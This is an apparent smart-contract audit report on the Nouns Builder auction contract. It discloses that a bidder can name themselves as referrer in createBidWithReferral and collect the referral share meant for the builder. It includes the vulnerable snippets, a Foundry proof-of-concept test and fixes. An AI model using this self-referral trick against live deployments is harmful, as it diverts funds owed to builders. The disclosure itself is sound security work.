Noisy Rose Blackbird

high

# createBidWithReferral: bidder can steal builder's reward by setting refferal as themselves

## Summary

If a bidder sets their referrer to themselves, they can receive a portion of the rewards that would otherwise belong to the builder.

## Vulnerability Detail

 

When setting the `currentBidReferral` in the `createBidWithReferral` function, it does not check if `_referral` is a bidder. So the bidder can set themselves as a referrer.

```solidity
function createBidWithReferral(uint256 _tokenId, address _referral) external payable nonReentrant {
@>  currentBidReferral = _referral;
    _createBid(_tokenId);
}
```

Normally, if there are no referrals, the referral share of the reward should go to the builder. This means that the bidder can steal some of the builder's reward tokens.

```solidity
function _computeTotalRewards(
    address _currentBidRefferal,
    uint256 _finalBidAmount,
    uint256 _founderRewardBps
) internal view returns (RewardSplits memory split) {

    ...

    // Set referral reward
@>  split.recipients[1] = _currentBidRefferal != address(0) ? _currentBidRefferal : builderRecipient;
    split.amounts[1] = (_finalBidAmount * referralRewardsBPS) / BPS_PER_100_PERCENT;

    ...
}
```

Here's the PoC code. You can add it to Auction.t.sol and run it.

```solidity
function test_FounderBuilderAndReferralReward_Selfref() external {
    // Setup
    deployAltMock(founder, 500);

    vm.prank(manager.owner());
    manager.registerUpgrade(auctionImpl, address(rewardImpl));

    vm.prank(auction.owner());
    auction.upgradeTo(address(rewardImpl));

    vm.prank(founder);
    auction.unpause();

    // Check reward values

    vm.prank(bidder1);
    auction.createBidWithReferral{ value: 1 ether }(2, bidder1);
    vm.warp(10 minutes + 1 seconds);

    auction.settleCurrentAndCreateNewAuction();

    assertEq(token.ownerOf(2), bidder1);
    assertEq(token.getVotes(bidder1), 1);

    assertEq(address(treasury).balance, 0.88 ether);
    assertEq(address(rewards).balance, 0.03 ether + 0.04 ether + 0.05 ether);

    assertEq(MockProtocolRewards(rewards).balanceOf(zoraDAO), 0.03 ether);
    assertEq(MockProtocolRewards(rewards).balanceOf(bidder1), 0.04 ether); // bidder get reward
    assertEq(MockProtocolRewards(rewards).balanceOf(founder), 0.05 ether);
}
```

## Impact

Some of the builder's rewards will be stolen.

## Code Snippet

[https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/db232c649b425c36f5a93607c95cfdf0e5962b2f/nouns-protocol/src/auction/Auction.sol#L145](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/db232c649b425c36f5a93607c95cfdf0e5962b2f/nouns-protocol/src/auction/Auction.sol#L145)

[https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/db232c649b425c36f5a93607c95cfdf0e5962b2f/nouns-protocol/src/auction/Auction.sol#L500](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/db232c649b425c36f5a93607c95cfdf0e5962b2f/nouns-protocol/src/auction/Auction.sol#L500)

## Tool used

Manual Review

## Recommendation

1. Do not allow self-referrals.
2. Restrict that only the NFT owner(members of the DAO) can be set as the refferal to prevent bypassing using a user's other accounts. (If the user is already in DAO, then it could be bypassed. But this is actually means “referrer” of bid, so I think it's fine.)